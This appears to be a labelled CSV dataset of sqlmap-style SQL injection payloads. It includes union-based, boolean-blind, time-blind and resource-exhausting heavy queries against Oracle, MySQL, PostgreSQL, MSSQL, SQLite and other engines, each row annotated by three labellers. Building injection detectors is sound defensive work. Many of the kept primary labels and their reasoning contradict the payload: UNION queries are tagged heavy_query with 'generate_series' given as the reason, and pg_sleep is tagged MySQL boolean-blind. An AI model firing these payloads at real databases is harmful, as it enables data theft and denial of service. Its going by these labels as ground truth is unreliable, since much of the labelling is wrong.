payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1"" ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""ruvo"" like ""ruvo",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2263,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"1"" ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""ruvo"" like ""ruvo"
"-1676'|| ( select 'xzmu' from dual where 6373 = 6373 union all select 6373,6373--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2264,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"-1676'|| ( select 'xzmu' from dual where 6373 = 6373 union all select 6373,6373--"
"1%' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and '%' = '",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2265,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1%' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and '%' = '"
"-7611 ) as tuje where 6101 = 6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2266,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7611 ) as tuje where 6101 = 6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--"
"1"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""bmbg"" like ""bmbg",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2267,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""bmbg"" like ""bmbg"
"-5625"" union all select 6087,6087,6087,6087,6087,6087--",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2268,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5625"" union all select 6087,6087,6087,6087,6087,6087--"
1' ) ) as yyud where 4934 = 4934,boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,2269,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as yyud where 4934 = 4934
"-7744"" ) ) ) union all select 9408,9408,9408,9408--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2270,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7744"" ) ) ) union all select 9408,9408,9408,9408--"
1 where 6827 = 6827,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2271,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 6827 = 6827
"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dnmi"" like ""dnmi",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,2272,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dnmi"" like ""dnmi"
"1"" ) ) as ynuw where 9138 = 9138",heavy_query,oracle,0.85,Multiple all_users table join,KEEP,,heavy_query,oracle,2273,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as ynuw where 9138 = 9138"
"1' where 6147 = 6147 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",boolean_blind,mysql,0.8,group by concat for boolean blind,KEEP,,boolean_blind,mysql,2274,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' where 6147 = 6147 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --"
"1%"" and ( 3020 = 3020 ) *6703 and ""%"" = """,boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2275,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1%"" and ( 3020 = 3020 ) *6703 and ""%"" = """
"-6496"" ) as obnf where 2903 = 2903 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2276,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-6496"" ) as obnf where 2903 = 2903 or make_set ( 9354 = 9354,7185 ) --"
-1432 order by 1#,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2277,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-1432 order by 1#
select case when 5433 = 6458 then 1 else null end--,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2278,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 5433 = 6458 then 1 else null end--
"1' ) where 7093 = 7093 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2279,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' ) where 7093 = 7093 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"-5058%' union all select 6789,6789,6789,6789,6789#",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,2280,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5058%' union all select 6789,6789,6789,6789,6789#"
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""%"" = """,boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2281,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""%"" = """
"1%"" ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""%"" = """,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2282,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1%"" ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""%"" = """
-9405' union all select 2539--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2283,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-9405' union all select 2539--
"-7565' ) ) union all select 7745,7745,7745,7745,7745,7745#",boolean_blind,generic,0.8,and equality for blind,KEEP,,boolean_blind,generic,2284,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7565' ) ) union all select 7745,7745,7745,7745,7745,7745#"
"1' ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2285,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"select pg_sleep ( 5 ) and ""%"" = """,boolean_blind,mysql,0.8,elT IF for boolean blind,KEEP,,boolean_blind,mysql,2286,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"select pg_sleep ( 5 ) and ""%"" = """
1 ) ) and 7533 = 7533 and ( ( 8738 = 8738,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2287,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) ) and 7533 = 7533 and ( ( 8738 = 8738
"1 ) where 9432 = 9432 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2288,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) where 9432 = 9432 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"1"" ) where 2633 = 2633 union all select null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2289,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) where 2633 = 2633 union all select null,null,null,null#"
select sleep ( 5 ) ) ||',time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,2290,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) ) ||'
"1"" where 5796 = 5796 and sleep ( 5 ) #",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,2291,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" where 5796 = 5796 and sleep ( 5 ) #"
1%' and 9127 = 7687--,boolean_blind,mysql,0.8,group by concat for boolean blind,KEEP,,boolean_blind,mysql,2292,boolean_blind,generic,Pattern match: 'and 9127 = 7687' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1%' and 9127 = 7687--
"1' ) as ybuv where 9641 = 9641 union all select null,null,null,null,null,null,null,null--",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2293,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) as ybuv where 9641 = 9641 union all select null,null,null,null,null,null,null,null--"
"1"" ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2294,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1"" ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"-6554' ) ) ) union all select 4384,4384,4384,4384,4384#",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2295,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6554' ) ) ) union all select 4384,4384,4384,4384,4384#"
1 ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2296,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #
"1'|| ( select 'cjwx' from dual where 7637 = 7637 and elt ( 9548 = 3991,3991 ) ) ||'",boolean_blind,generic,0.8,and equality for blind,KEEP,,boolean_blind,generic,2297,boolean_blind,oracle,Pattern match: 'elt (' → boolean_blind (P3); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"1'|| ( select 'cjwx' from dual where 7637 = 7637 and elt ( 9548 = 3991,3991 ) ) ||'"
"-1164"" ) union all select 6617,6617,6617,6617,6617,6617--",time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,2298,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1164"" ) union all select 6617,6617,6617,6617,6617,6617--"
"1"" where 3510 = 3510",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2299,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 3510 = 3510"
"1"" ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""fbqy"" like ""fbqy",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2300,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""fbqy"" like ""fbqy"
"-8382"" ) ) order by 1--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2301,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"-8382"" ) ) order by 1--"
"1 ) ) as fynx where 9636 = 9636 union all select null,null,null,null,null--",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2302,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) as fynx where 9636 = 9636 union all select null,null,null,null,null--"
"-9734' ) ) as izbx where 6273 = 6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",heavy_query,oracle,0.85,Multiple all_users table join,KEEP,,heavy_query,oracle,2303,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9734' ) ) as izbx where 6273 = 6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--"
1 ) ) as izvy where 2569 = 2569,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2304,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as izvy where 2569 = 2569
1'+ ( select qydm where 6019 = 6019,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2305,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select qydm where 6019 = 6019
1' ) and sleep ( 5 ) and ( 'njud' = 'njud,heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2306,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' ) and sleep ( 5 ) and ( 'njud' = 'njud
select ( case when ( 4568 = 4241 ) then 4568 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2307,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,select ( case when ( 4568 = 4241 ) then 4568 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--
-3613%' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( '%' = ',boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2308,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,-3613%' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( '%' = '
"1%"" ) ) union all select null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2309,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) ) union all select null,null#"
"1%' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( '%' = '",boolean_blind,generic,0.8,and equality for blind,KEEP,,boolean_blind,generic,2310,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1%' ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( '%' = '"
"-9145' ) as xyya where 8950 = 8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",boolean_blind,generic,0.8,and equality for blind,KEEP,,boolean_blind,generic,2311,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9145' ) as xyya where 8950 = 8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--"
1%' ) ) and 9198 = 9198--,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2312,boolean_blind,generic,Pattern match: 'and 9198 = 9198' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1%' ) ) and 9198 = 9198--
-8301' ) ) ) or ( 5708 = 5268 ) *5268 and ( ( ( 'hkha' = 'hkha,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,2313,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-8301' ) ) ) or ( 5708 = 5268 ) *5268 and ( ( ( 'hkha' = 'hkha
"-9698' ) ) as qnjv where 3360 = 3360 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2314,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-9698' ) ) as qnjv where 3360 = 3360 or make_set ( 9354 = 9354,7185 ) --"
"1"" ) ) as aozi where 3354 = 3354 waitfor delay '0:0:5'--",time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,2315,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"1"" ) ) as aozi where 3354 = 3354 waitfor delay '0:0:5'--"
"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2316,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #"
"make_set ( 2672 = 2672,5440 )",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2317,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"make_set ( 2672 = 2672,5440 )"
1 ) as odqn where 3910 = 3910,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2318,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as odqn where 3910 = 3910
-8945 ) ) as fszo where 2320 = 2320 union all select 2320--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2319,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-8945 ) ) as fszo where 2320 = 2320 union all select 2320--
"-5097' ) union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2320,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5097' ) union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--"
"1', ( select ( case when ( 5777 = 5777 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2321,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"1', ( select ( case when ( 5777 = 5777 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )"
"1' ) ) as arhm where 3268 = 3268 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2322,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) as arhm where 3268 = 3268 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --"
"1 ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 9509 = 9509",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2323,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1 ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 9509 = 9509"
1' ) or sleep ( 5 ),boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,2324,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' ) or sleep ( 5 )
"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""xmvr"" = ""xmvr",boolean_blind,generic,0.8,and equality for blind,KEEP,,boolean_blind,generic,2325,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""xmvr"" = ""xmvr"
"1"" where 4597 = 4597 rlike sleep ( 5 ) --",error_based,mysql,0.85,exp() for error extraction,KEEP,,error_based,mysql,2326,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" where 4597 = 4597 rlike sleep ( 5 ) --"
"1'|| ( select 'goxu' where 9215 = 9215 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2327,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1'|| ( select 'goxu' where 9215 = 9215 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
"1"" ) as hoiv where 9708 = 9708 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,2328,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) as hoiv where 9708 = 9708 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --"
"1'+ ( select 'aliz' where 5050 = 5050 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) +'",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2329,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1'+ ( select 'aliz' where 5050 = 5050 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) +'"
